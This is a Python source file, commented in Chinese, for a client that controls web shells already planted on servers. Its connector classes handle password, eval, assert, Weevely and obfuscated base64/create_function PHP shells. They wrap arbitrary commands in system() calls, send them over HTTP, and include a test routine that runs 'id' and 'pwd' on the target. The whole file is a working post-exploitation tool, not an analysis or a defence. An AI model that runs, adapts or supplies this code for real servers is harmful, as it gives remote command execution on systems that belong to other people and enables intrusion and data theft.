import aiohttp
import asyncio
import base64
from typing import List, Dict, Any, Optional, Tuple
from loguru import logger
import time
from abc import ABC, abstractmethod
import json
import requests
from utils.models import ConnectionInfo

from .config import config

class BaseExecutor:
    """BaseExecutor class"""
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.logger = logger
    
    def _process_output(self, output: str) -> str:
        """Process command output"""
        if not output:
            return ""
        return output.strip()
    
    def execute_command(self, url: str, command: str, connection_info: ConnectionInfo) -> Tuple[bool, str]:
        """
        Execute WebShell command
        """
        try:
            # Prepare request headers and parameters
            headers = {}
            data = {}
            
            if connection_info.obfuscated:
                # 处理混淆的 webshell
                # 将命令进行 base64 编码
                # 创建一个匿名函数,接受两个参数 $a 和 $b,然后执行命令
                data = {
                    connection_info.obfuscated_params['func_name']: 'create_function',
                    connection_info.obfuscated_params['decode_func']: 'base64_decode',
                    connection_info.obfuscated_params['param1']: base64.b64encode(''.encode()).decode(),
                    connection_info.obfuscated_params['param2']: base64.b64encode(f"system('{command}');".encode()).decode(),
                    connection_info.obfuscated_params['cmd_param']: base64.b64encode(''.encode()).decode()
                }
            elif connection_info.use_raw_post:
                # 使用原始 POST 数据,将命令包装在 system() 中
                data = f"system('{command}');"  # 直接发送命令作为原始 POST 数据
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
            elif connection_info.preg_replace:
                # preg_replace 类型的 webshell,使用 echo system() 方式
                php_command = f"echo system('{command}');"
                data = {connection_info.password: php_command}
            else:
                # 将命令包装在 system() 函数中
                php_command = f"system('{command}');"
                
                if connection_info.special_auth and connection_info.special_auth.get('type') == 'user_agent':
                    # 设置 User-Agent 验证
                    headers['User-Agent'] = connection_info.special_auth.get('value')
                    # 将命令作为 $_REQUEST 参数
                    data = {None: php_command}
                else:
                    # 默认使用参数方式
                    data = {None: php_command}
                    if connection_info.param_name:
                        data = {connection_info.param_name: php_command}
            
            self.logger.debug(f"发送请求头: {headers}")
            self.logger.debug(f"发送请求数据: {data}")
            
            # 发送请求
            if connection_info.method.upper() == 'GET':
                response = requests.get(url, params=data, headers=headers, timeout=self.timeout)
            else:
                response = requests.post(url, data=data, headers=headers, timeout=self.timeout)
            
            self.logger.debug(f"请求URL: {response.url}")
            self.logger.debug(f"原始响应: {response.text}")
            
            # 处理输出
            output = self._process_output(response.text)
            self.logger.debug(f"处理后输出: {output}")
            
            if not output and response.status_code == 200:
                self.logger.error(f"执行失败: status={response.status_code}, output={output}")
                return False, output
            
            return True, output
            
        except Exception as e:
            self.logger.error(f"请求异常: {str(e)}")
            return False, str(e)

class WebShellConnector(ABC):
    """WebShell连接器基类"""
    
    @abstractmethod
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        """执行命令"""
        pass

class BaseConnector:
    """基础连接器类"""
    def prepare_request(self, command: str) -> Dict[str, str]:
        raise NotImplementedError()
        
    def process_response(self, response: str) -> str:
        return response.strip()

class PasswordConnector(BaseConnector):
    """密码型WebShell连接器"""
    def __init__(self, password: str = "test123", param_name: str = "cmd"):
        self.password = password
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class EvalConnector(BaseConnector):
    """Eval型WebShell连接器"""
    def __init__(self, param_name: str = "code"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class ParameterConnector(BaseConnector):
    """参数型WebShell连接器（用于JSP/ASPX）"""
    def __init__(self, param_name: str = "cmd"):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        return {self.param_name: command}

class WeevelyConnector(BaseConnector):
    """Weevely WebShell连接器"""
    def __init__(self, password: str):
        self.password = password
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        # Weevely使用特殊的编码方式
        encoded_cmd = base64.b64encode(command.encode()).decode()
        return {
            'pass': self.password,
            'cmd': encoded_cmd
        }
        
    def process_response(self, response: str) -> str:
        try:
            # Weevely的响应也是base64编码的
            return base64.b64decode(response).decode()
        except:
            return response

class CustomConnector(WebShellConnector):
    """自定义连接器"""
    def __init__(self, payload_template: str, **kwargs):
        self.payload_template = payload_template
        self.kwargs = kwargs
    
    async def execute(self, command: str, session: aiohttp.ClientSession) -> Dict[str, Any]:
        return {k: v.format(command=command) for k, v in self.kwargs.items()}

class AssertConnector(BaseConnector):
    """Assert型WebShell连接器"""
    def __init__(self, param_name: str = '_'):
        self.param_name = param_name
        
    def prepare_request(self, command: str) -> Dict[str, str]:
        php_code = f'system("{command}");'
        return {self.param_name: php_code}

class WebShellExecutor:
    def __init__(self, url: str, connector: WebShellConnector):
        self.url = url
        self.connector = connector
        self.session = None
    
    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    async def execute_command(self, command: str) -> Dict[str, Any]:
        """执行单个命令"""
        start_time = time.time()
        try:
            # 获取请求数据
            data = await self.connector.execute(command, self.session)
            logger.debug(f"发送请求数据: {data}")
            
            # 发送请求
            async with self.session.post(self.url, data=data) as response:
                execution_time = time.time() - start_time
                content = await response.text()
                logger.debug(f"原始响应: {content}")
                
                try:
                    # 尝试解析JSON响应
                    result = json.loads(content)
                    if isinstance(result, dict):
                        if not result.get('success', False):
                            logger.error(f"WebShell执行错误: {result.get('error', '未知错误')}")
                            return {
                                'success': False,
                                'error': result.get('error', '未知错误'),
                                'execution_time': execution_time
                            }
                        
                        output = result.get('output', '')
                        if output:
                            try:
                                output = base64.b64decode(output).decode('utf-8')
                                logger.debug(f"解码后输出: {output}")
                            except Exception as e:
                                logger.error(f"Base64解码失败: {e}")
                        
                        return {
                            'success': True,
                            'output': output,
                            'execution_time': execution_time,
                            'status_code': response.status
                        }
                except json.JSONDecodeError:
                    # 如果不是JSON，尝试常规处理
                    output = content
                    try:
                        output = base64.b64decode(content).decode('utf-8')
                        logger.debug(f"解码后输出: {output}")
                    except Exception as e:
                        logger.error(f"Base64解码失败: {e}")
                        logger.debug(f"使用原始输出: {output}")
                    
                    success = response.status == 200 and output.strip() != ''
                    if not success:
                        logger.error(f"执行失败: status={response.status}, output={output}")
                    
                    return {
                        'success': success,
                        'output': output,
                        'execution_time': execution_time,
                        'status_code': response.status
                    }
                
        except Exception as e:
            logger.error(f"执行命令失败: {str(e)}")
            import traceback
            logger.debug(f"错误详情: {traceback.format_exc()}")
            return {
                'success': False,
                'error': str(e),
                'execution_time': time.time() - start_time
            }
    
    async def execute_commands(self, commands: List[str]) -> List[Dict[str, Any]]:
        """执行多个命令"""
        results = []
        for cmd in commands:
            result = await self.execute_command(cmd)
            results.append({
                'command': cmd,
                **result
            })
        return results

async def test_webshell(url: str, connection_info: ConnectionInfo, executor: BaseExecutor) -> Dict[str, Any]:
    """测试WebShell连接"""
    try:
        # 测试基本命令
        success, output = executor.execute_command(url, connection_info.test_command, connection_info)
        if not success:
            return {
                'success': False,
                'error': '基本命令执行失败',
                'details': output
            }
        
        # 测试系统信息命令
        success, output = executor.execute_command(url, "id;", connection_info)
        if not success:
            return {
                'success': False,
                'error': '系统信息命令执行失败',
                'details': output
            }
        
        # 测试目录命令
        success, output = executor.execute_command(url, "pwd;", connection_info)
        if not success:
            return {
                'success': False,
                'error': '目录命令执行失败',
                'details': output
            }
        
        return {
            'success': True,
            'test_output': output,
            'system_info': output,
            'current_dir': output
        }
        
    except Exception as e:
        logger.error(f"测试WebShell时发生错误: {str(e)}")
        return {
            'success': False,
            'error': str(e)
        }

# 预定义的连接器工厂
def create_connector(shell_type: str, **kwargs) -> BaseConnector:
    """创建对应类型的连接器"""
    connectors = {
        'password': PasswordConnector,
        'eval': EvalConnector,
        'parameter': ParameterConnector,
        'weevely': WeevelyConnector,
        'assert': AssertConnector
    }
    
    if shell_type not in connectors:
        raise ValueError(f"不支持的WebShell类型: {shell_type}")
        
    return connectors[shell_type](**kwargs)
